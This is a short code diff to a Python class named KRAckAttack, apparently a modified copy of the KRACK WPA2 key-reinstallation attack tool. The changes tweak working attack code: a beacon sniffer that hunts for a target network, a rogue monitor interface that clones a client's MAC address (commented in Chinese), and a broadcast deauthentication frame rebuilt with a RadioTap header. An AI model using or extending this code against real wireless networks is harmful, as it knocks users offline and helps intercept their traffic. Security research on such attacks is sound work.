@@ -510,8 +510,6 @@ class KRAckAttack():
 
 	def find_beacon(self, ssid):
 		ps = sniff(count=100, timeout=30, lfilter=lambda p: p.haslayer(Dot11Beacon) and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, iface=self.nic_real) # opened_socket=self.sock_real iface=self.nic_real
-		print('505: ', end='')
-		print(ps)
 		if ps is None or len(ps) < 1:
 			log(STATUS, "Searching for target network on other channels")
 			for chan in [1, 6, 11, 3, 8, 2, 7, 4, 10, 5, 9, 12, 13]:
@@ -870,8 +868,7 @@ class KRAckAttack():
 		subprocess.check_output(["iwconfig", self.nic_rogue_mon, "mode", "monitor"])
 		subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])
 
-
-		# 3. Configure interface on real channel to ACK frames
+		# 如果有指定 client 端的 MAC addr.，將此網卡的 MAC addr.換成 client 端的
 		if self.clientmac:
 				self.nic_real_clientack = self.nic_real + "sta1"
 				subprocess.check_output(["iw", self.nic_real, "interface", "add", self.nic_real_clientack, "type", "managed"])
@@ -944,7 +941,8 @@ class KRAckAttack():
 		self.send_csa_beacon(numbeacons=4)
 
 		# Try to deauthenticated all clients
-		deauth = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.apmac, addr3=self.apmac)/Dot11Deauth(reason=3)
+		dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.apmac, addr3=self.apmac)
+		deauth = RadioTap()/dot11/Dot11Deauth(reason=7)
 		self.sock_real.send(deauth)
 
 		# For good measure, also queue a dissasociation to the targeted client on the rogue channel
